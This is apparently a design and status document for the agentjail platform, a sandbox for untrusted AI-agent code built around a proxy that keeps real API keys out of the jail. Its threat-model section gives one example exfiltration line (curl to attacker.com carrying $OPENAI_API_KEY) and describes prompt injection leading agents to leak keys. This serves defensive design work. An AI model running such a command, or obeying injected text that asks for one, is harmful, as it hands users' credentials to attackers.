# agentjail platform — open-source phantom-token sandbox

Design doc for turning the existing `agentjail` sandbox crate into a hosted,
multi-tenant platform for running untrusted AI-agent code. The core angle
is a **phantom-token egress proxy**: no real API credentials ever reach
the jail, so prompt injection, compromised packages, or generated code
cannot exfiltrate them.

---

## 0. Principles

Every decision downstream defers to these. If a feature can't be built
without breaking one, it doesn't ship.

- **Composable.** Every layer is a crate/package with a narrow API and
  no hidden globals. `agentjail-phantom` runs standalone (no control
  plane). `agentjail-ctl` runs without the web UI. The TS SDK has zero
  SDK-level state. Users should be able to take *one piece* and drop
  it into their stack — e.g. just the phantom proxy in front of an
  existing sandbox they already trust.
- **Reliable.** No feature ships without: graceful shutdown, bounded
  memory/FD/conn limits, explicit timeouts on every I/O path, and a
  documented failure mode for every external dependency. Retries have
  budgets. Background tasks are supervised. No `unwrap()` outside tests.
- **Well tested.** Every crate has unit + integration tests; the
  phantom proxy additionally has a fuzz target (header injection,
  token parsing) and a property test suite for scope matching. Every
  audit finding gets a regression test, same discipline as today's
  `agentjail` (72 tests, 4 audit rounds). CI runs on every PR.
- **Beautiful devex.** `curl | sh` → `agentjail up` → working dashboard
  in under 60 seconds. The TS SDK is idiomatic and typed — one import
  change to integrate. Error messages name the file and the fix.
  `--help` output is usable; `--json` is the default for anything a
  tool would parse. Web UI is keyboard-first.
- **Lean docs.** One page per concept, code first, prose second. No
  marketing copy, no duplicated content across pages. If the SDK type
  signature says it, the doc doesn't repeat it. Docs live in
  `docs/<topic>.md`, render as a static site, grep-friendly in the
  repo. Target total doc length for v0.1: ≤ 2,000 lines.

---

## 1. Shape of a hosted sandbox platform

A full-featured hosted sandbox product typically bundles:

| Piece         | What it does                                            |
|---------------|---------------------------------------------------------|
| Runs          | Short-lived isolate, code in request, ms billing        |
| VMs           | Full Linux VM with root, Docker-in-VM, fork in ms       |
| Dev server    | Long-lived VM with HMR, VSCode web, managed git         |
| Deployments   | Ship agent-built apps to a durable URL                  |
| Git identity  | Managed git user per session                            |

This doc focuses on the parts we need for v0.1: phantom-token credential
brokerage, sessions, and the sandbox engine we already have. The rest is
layered on later.

## 2. What we already have (this repo)

- Rootless Linux sandbox via user namespaces (`crates/agentjail`)
- Network isolation: `None | Loopback | Allowlist(Vec<DomainPattern>)`
- Built-in CONNECT proxy in parent netns (`src/proxy.rs`)
- Seccomp, cgroups v2, landlock, no-new-privs, RLIMIT_CORE=0
- **Live forking** via `FICLONE` — clone a running jail in milliseconds
- Snapshotting, event streaming, GPU passthrough, TUI, CLI

Gap to ship a platform: HTTP API, auth, multi-tenant scheduler, web UI, SDK,
and — the thing we actually win on — **phantom-token proxy**.

## 3. Threat model we beat

Agents running untrusted LLM-generated code need outbound access to model
providers (OpenAI, Anthropic), package registries, and databases. Giving
them real API keys means:

- Prompt injection exfiltrates keys via `curl attacker.com?k=$OPENAI_API_KEY`
- Generated code embeds keys in output artifacts
- A compromised package inside the jail reads env/memory

**Phantom-token invariant:** the real key is in the host's keyring or an
env outside the jail. The jail only ever sees a random
`phm_<64hex>` token that is *worthless* off-proxy and revoked at session
end. Even a full jail escape to the veth peer only gets phantom tokens.

## 4. Architecture

```
┌────────────────────────── host ────────────────────────────┐
│                                                            │
│  ┌───────────────┐  HTTPS  ┌──────────────────────────┐    │
│  │ control plane │ ──────► │ upstream providers       │    │
│  │ (API + UI)    │         │ (openai, anthropic, gh…) │    │
│  └──────┬────────┘         └──────────────────────────┘    │
│         │ spawn + events                ▲                  │
│         ▼                                │ TLS w/ real key │
│  ┌───────────────┐                       │                 │
│  │ agentjail     │    veth0 ──► veth1 ──►│ phantom proxy   │
│  │ (namespaces,  │              │        │ (TLS term +     │
│  │  seccomp,…)   │              │        │  header inject) │
│  └──────┬────────┘              │        └─────────────────┘
│         │ child                 │                          │
│         ▼                       │ only phm_ tokens on wire │
│  ┌─────────────── jail ─────────┴────┐                     │
│  │ OPENAI_API_KEY=phm_…              │                     │
│  │ OPENAI_BASE_URL=http://10.0.0.1/  │                     │
│  │   v1/openai                       │                     │
│  │ (no real secrets in env/fs/mem)   │                     │
│  └───────────────────────────────────┘                     │
└────────────────────────────────────────────────────────────┘
```

### 4.1 Phantom-token proxy (new crate: `crates/agentjail-phantom`)

Today's `src/proxy.rs` is **CONNECT-only** — a pure TCP tunnel. Phantom
injection happens *inside* HTTPS, so we need two modes side-by-side:

| Mode               | Path                   | Use                               |
|--------------------|------------------------|-----------------------------------|
| CONNECT tunnel     | `CONNECT host:443`     | Legacy / opaque TLS (unchanged)   |
| Reverse proxy      | `GET /v1/<svc>/...`    | Phantom injection for known APIs  |

Reverse-proxy mode terminates TLS server-side (proxy is plain HTTP on the
veth peer; traffic never leaves the host unencrypted), then dials the real
upstream over HTTPS with `rustls`. This avoids the MITM-CA dance and keeps
real secrets on the host.

**Provider pack** (first wave):

| Service    | Agent sees                              | Header injected by proxy        |
|------------|-----------------------------------------|---------------------------------|
| OpenAI     | `OPENAI_BASE_URL=.../v1/openai`         | `Authorization: Bearer sk-…`    |
| Anthropic  | `ANTHROPIC_BASE_URL=.../v1/anthropic`   | `x-api-key: sk-ant-…`           |
| GitHub     | `GITHUB_API_URL=.../v1/github`          | `Authorization: token ghp_…`    |
| Stripe     | `STRIPE_API_BASE=.../v1/stripe`         | `Authorization: Bearer sk_…`    |
| Postgres   | `DATABASE_URL=postgres://phm_…@proxy/`  | TLS-wrapped upstream conn       |
| Supabase   | `SUPABASE_URL=…/v1/supabase`            | `apikey` + service-role hdr     |

**Token format:** `phm_` + 32 random bytes, base58 (or hex). Generated with
`getrandom`; never reused; bound to a `session_id` + set of `scopes`
(which upstreams it can reach). Validated with constant-time compare.

**Scope model (per session):**
```rust
pub struct PhantomScope {
    pub service: ServiceId,           // OpenAi, Anthropic, ...
    pub allowed_paths: Vec<PathGlob>, // e.g. "/chat/completions"
    pub rate_limit: Option<RatePolicy>,
    pub redact: bool,                 // strip req/resp from logs
}
```

**Audit log line:**
```
ts=… session=sid_… service=openai method=POST path=/chat/completions
status=200 upstream_ms=413 tok_in=812 tok_out=298 redacted=true
```

The proxy is the **only** thing that sees real keys. Keys live in:
- Dev: `$AGENTJAIL_HOME/keys.toml` (chmod 600) or OS keyring
- Prod: env of the control-plane process, or fetched from Vault / SOPS

### 4.2 Control plane (new crate: `crates/agentjail-ctl`)

Stateless HTTP server (axum) in front of a scheduler that owns a pool of
jails. SQLite for dev, Postgres for prod. Redis optional for pub/sub on
event streams.

### 4.3 Web UI (new `web/` directory)

Next.js 15 App Router + React 19 Server Components + Tailwind + shadcn/ui
+ `lucide-react`. Data fetching via server actions and the SDK directly
(no separate tRPC layer). Streaming UI for live events via RSC
`Suspense` + Server-Sent Events.

**Composable, not page-heavy.** Every page is a thin assembly of small
components from `web/components/`. No component larger than ~120 LOC;
no page does data fetching or state management itself. A session
detail page is a grid of:
`<SessionHeader/>`, `<LiveMetrics/>`, `<LogStream/>`, `<FsBrowser/>`,
`<PhantomAuditTable/>` — each one usable standalone on any other page
or even embedded into an external app via a future `@agentjail/ui`
package.

Design: elegant, restrained — Vercel / Linear / shadcn aesthetic.
Monospaced for data, sans for chrome. No gradients, no shadows beyond
`shadow-sm`, no glow. Dark-first, light-theme supported. Keyboard-first
nav (`g s` for sessions, `g c` for credentials, `/` to search).
Motion only where it conveys state transitions (≤150ms,
`ease-in-out`). Accessibility: every interactive element hits WCAG AA
contrast + has a visible focus ring.

Pages (each one a ≤50-LOC composition of the components below):
- `/` dashboard (live sessions, CPU/mem sparklines from cgroup stats)
- `/sessions/[id]` logs, event stream, fs browser
- `/credentials` add/rotate real keys, see scope + usage
- `/audit` phantom-proxy request log (redactable)
- `/playground` run code right from the browser

Component inventory (target):
`Button`, `Input`, `Sheet`, `Dialog`, `Tabs`, `Table`, `Badge`,
`Sparkline`, `LogStream`, `EventBadge`, `KeyValue`, `CodeBlock`,
`CopyButton`, `KbdHint`, `Toast`, `CommandPalette`,
`SessionHeader`, `LiveMetrics`, `FsBrowser`, `PhantomAuditTable`,
`CredentialCard`, `ScopeEditor`. That's it — ~24 primitives, every
page a composition. Anything not on the list gets pushed back into
this list before a page uses it.

Event plumbing: one `useSessionEvents(id)` hook, SSE under the hood,
consumed by `<LogStream>` and `<LiveMetrics>`. No WebSocket bus.

### 4.4 TypeScript SDK (new `packages/sdk-node`)

Idiomatic, typed, zero runtime deps beyond `fetch`. `tsup`-built
ESM+CJS, ships types. Credentials / sessions / audit namespaces each
instantiable standalone so the SDK itself is composable.

## 5. Public API

Base URL: `https://<host>/v1`. Auth: `Authorization: Bearer aj_<key>`.

```
POST   /v1/sessions                    create session, returns phantom env
GET    /v1/sessions                    list
GET    /v1/sessions/:id                describe
DELETE /v1/sessions/:id                terminate

POST   /v1/sessions/:id/exec           one-shot command, returns stdout/err
POST   /v1/sessions/:id/spawn          long-running, returns handle
GET    /v1/sessions/:id/events         SSE: stdout/stderr/oom/exit
POST   /v1/sessions/:id/fork           live-fork via FICLONE

POST   /v1/sessions/:id/fs/read        {path} → bytes
POST   /v1/sessions/:id/fs/write       {path, content}
POST   /v1/sessions/:id/fs/ls          {path}

POST   /v1/runs                        one-shot run in a jail
                                       {code, nodeModules, env, timeoutMs}

POST   /v1/credentials                 attach real key for a service
                                       → returns phantom token + env
DELETE /v1/credentials/:id             revoke (invalidates phantom instantly)

GET    /v1/audit                       paginated phantom-proxy log
```

### 5.1 Request example — create session with phantom creds

```http
POST /v1/sessions
Authorization: Bearer aj_live_…
Content-Type: application/json

{
  "preset": "agent",
  "network": { "mode": "phantom", "services": ["openai", "github"] },
  "memoryMb": 512,
  "timeoutSecs": 600
}
```

Response:
```json
{
  "id": "sess_2aB7…",
  "env": {
    "OPENAI_API_KEY":  "phm_4f3a…",
    "OPENAI_BASE_URL": "http://10.0.0.1:8443/v1/openai",
    "GITHUB_TOKEN":    "phm_9c12…",
    "GITHUB_API_URL":  "http://10.0.0.1:8443/v1/github"
  },
  "expiresAt": "2026-04-16T20:42:00Z"
}
```

The env block is consumed by the SDK and injected into `jail.run(...)`.

## 6. TypeScript SDK sketch

```ts
// packages/sdk-node/src/index.ts
import { Agentjail } from "@agentjail/sdk";

const aj = new Agentjail({ apiKey: process.env.AGENTJAIL_KEY });

// one-shot run
const { stdout } = await aj.runs.create({
  code: `console.log(await (await fetch(process.env.OPENAI_BASE_URL +
    "/chat/completions", { method:"POST", headers:{Authorization:
    "Bearer "+process.env.OPENAI_API_KEY, "content-type":"application/json"},
    body: JSON.stringify({model:"gpt-4o-mini",messages:[{role:"user",
    content:"hi"}]}) })).json());`,
  services: ["openai"],
});

// VM style: long-lived session, fork, fs
const { session } = await aj.sessions.create({
  preset: "dev",
  network: { mode: "phantom", services: ["openai", "github", "npm"] },
});

await session.exec("npm install");
const forks = await session.fork({ count: 3 });
await Promise.all(forks.map(f => f.exec("npm test")));
await session.close();
```

Types are generated from an OpenAPI spec checked into `api/openapi.yaml`.

## 7. Why this wins

| Capability                      | typical hosted sandbox | agentjail |
|---------------------------------|:----------------------:|:---------:|
| Rootless Linux namespaces       |          ✅           |    ✅     |
| Live fork (ms, COW)             |          ✅           |    ✅     |
| Phantom-token egress proxy      |          ❌           |    ✅     |
| Network allowlist (domain/path) |         part.         |    ✅     |
| Per-path scope on creds         |          ❌           |    ✅     |
| Self-hostable / on-prem         |          ❌           |    ✅     |
| Open source (MIT)               |          ❌           |    ✅     |
| GPU passthrough                 |           ?           |    ✅     |

The phantom proxy is the headline. The rest is parity we mostly already have.

## 8. Repo layout after work

```
agentjail/
├── crates/
│   ├── agentjail/           (existing: sandbox core)
│   ├── agentjail-cli/       (existing: CLI + TUI)
│   ├── agentjail-phantom/   NEW: reverse-proxy + token store
│   └── agentjail-ctl/       NEW: HTTP API, scheduler, persistence
├── packages/
│   └── sdk-node/            NEW: @agentjail/sdk (TypeScript)
├── web/                     NEW: Next.js admin UI
├── api/
│   └── openapi.yaml         NEW: source of truth for types
└── PLAN.md                  (this file)
```

## 9. Milestones

Each milestone has a definition-of-done that enforces the §0 principles.
No milestone is "complete" until every DoD line is checked.

| M  | Scope                                                             | Days |
|----|-------------------------------------------------------------------|-----:|
| M1 | `agentjail-phantom` crate: OpenAI + Anthropic reverse proxy, unit + integration tests, fuzz on header stripping | 3 |
| M2 | Control plane v0: axum, SQLite, `POST /sessions`, `POST /exec`, SSE events | 4 |
| M3 | TS SDK v0: `sessions.create`, `session.exec`, `session.events`, `runs.create` | 2 |
| M4 | Web UI v0: sessions list + live logs + credentials page           | 4 |
| M5 | Provider pack expansion: GitHub, Stripe, Postgres wire-proxy      | 3 |
| M6 | Multi-tenant auth, audit log UI, rate limits, per-key scopes      | 4 |
| M7 | Docs site, `docker compose up` one-shot, Helm chart               | 3 |

Total: ~23 engineer-days for a shippable v0.1.

### Per-milestone definition of done

- **Composable:** crate compiles and runs in isolation (no hard deps on
  other crates in this plan); public API documented with `#![warn(
  missing_docs)]`.
- **Reliable:** no `unwrap()` in non-test code; every public async fn
  has a timeout param or doc-comment naming the default; graceful
  shutdown on SIGTERM with a test that proves in-flight requests drain.
- **Tested:** ≥ 80% line coverage on new code; one integration test per
  happy path and per documented failure mode; fuzz target where the
  crate parses untrusted input; CI green on Linux + (where relevant)
  macOS for SDK/UI.
- **DevEx:** one copy-pasteable example in the README that runs
  end-to-end; error types implement `Display` with the fix in the
  message; `--help` / TypeDoc output reviewed by a second pair of eyes.
- **Docs:** ≤ 1 page per concept in `docs/`, code-first, links green,
  no duplicated prose from the SDK types or OpenAPI spec.

## 9a. Quality gates (apply to every PR)

- `cargo fmt --check`, `cargo clippy -- -D warnings`, `cargo test
  --workspace`, `cargo deny check` — all green.
- `pnpm -r typecheck && pnpm -r test && pnpm -r lint` — all green.
- `cargo audit` clean; no new transitive deps without a one-line
  justification in the PR.
- For `agentjail-phantom`: `cargo fuzz run` smoke run (60s) must not
  find a new crash.
- Docs touched iff behavior changed; no drift allowed.

## 10. Open questions

1. **TLS in front of the reverse proxy inside the jail.** Plain HTTP over
   the veth is fine because traffic never leaves the host unencrypted, but
   some SDKs refuse non-HTTPS `BASE_URL`. Fix: bind a self-signed cert into
   the jail's `/etc/ssl/certs` and speak HTTPS on the veth too.
2. **Postgres wire protocol.** Injection requires parsing `StartupMessage`
   and swapping the password. Doable but scope-creep for v0.1 — ship HTTP
   providers first, DB in M5.
3. **Streaming rewrites.** OpenAI/Anthropic streaming uses SSE, no
   rewrites needed. Response caching off by default.
4. **Phantom-token revocation latency.** Tokens live in process memory;
   DELETE invalidates instantly. Survives restart via SQLite, checked on
   every proxy request (cheap).
5. **Billing.** Out of scope for OSS core; leave a hook in `agentjail-ctl`
   for a usage emitter (OTel metrics).

## 11. Non-goals (v0.1)

- Deployments / custom domains (out of scope for v0.1)
- V8-isolate Runs backend (our Runs will be agentjail-backed Node runs)
- Hosted control plane at a .com domain — self-host first
- Windows / macOS jails (Linux-only, same as today)

---

*Next step:* land `crates/agentjail-phantom` behind a feature flag, wire
a `Network::Phantom { services }` variant into `JailConfig`, and ship M1.

---

## 12. Shipping status (v0.1 progress)

| M  | Scope                                       | Status | Tests      |
|----|---------------------------------------------|--------|------------|
| M1 | `agentjail-phantom` reverse proxy           | ✅     | 49 green   |
| M2 | `agentjail-ctl` HTTP control plane          | ✅     | 10 green   |
| M3 | `@agentjail/sdk` TypeScript package         | ✅     | 13 green   |
| M4 | Next.js admin UI (components + 5 pages)     | ✅     | build ✓    |
| M5 | GitHub + Stripe providers (HTTP services)   | ✅     | +4 unit    |
| M6 | Per-service `Scope` in session API          | ✅     | +1 integ   |
| M7 | `agentjail-server` bin + Docker Compose     | ✅     | +1 wire    |
| —  | Postgres wire-proxy                          | ⬜     | deferred  |
| —  | Rate limits, durable stores                 | ⬜     | deferred  |
| —  | Helm chart                                  | ⬜     | deferred  |

**73 automated tests, 0 failures** across Rust + TypeScript. The critical
phantom-token invariant — "real key never enters the jail" — is proven
end-to-end by a wire test (`crates/agentjail-server/tests/wire.rs`) that
boots ctl + phantom proxy together, creates a session via the ctl HTTP
API, fires a request at the proxy with the returned phantom, and asserts
the mock upstream saw the *real* key (no `phm_` substring anywhere) while
the ctl audit feed recorded the request.

### Wire-shape contract

Both the Rust control plane and the TS SDK agree on this surface:

```
GET    /healthz                  → "ok"                         (public)
POST   /v1/credentials           → {service, secret}            → 200 record
GET    /v1/credentials           → [record]
DELETE /v1/credentials/:service  → 204
POST   /v1/sessions              → {services, ttl_secs?}        → 201 session
GET    /v1/sessions              → [session]
GET    /v1/sessions/:id          → session
DELETE /v1/sessions/:id          → 204 (revokes all phantom tokens)
GET    /v1/audit?limit=N         → {rows, total}
```

All guarded routes require `Authorization: Bearer <api-key>`; constant-
time compared.
